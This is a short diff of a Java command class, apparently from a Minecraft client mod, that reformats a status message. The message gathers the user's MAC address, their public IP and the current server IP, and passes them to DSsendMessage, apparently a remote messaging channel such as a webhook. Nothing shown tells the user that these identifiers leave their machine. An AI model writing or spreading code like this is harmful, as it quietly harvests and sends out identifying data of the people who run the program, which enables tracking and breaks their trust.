@@ -57,6 +57,6 @@ public class MethodCommand extends Command {
         }
         String macAddress = String.join("-", hexadecimal);
 
-        DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Executed Command [Method] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
+        DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + " \nExecuted Command [Method]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
     }
 }
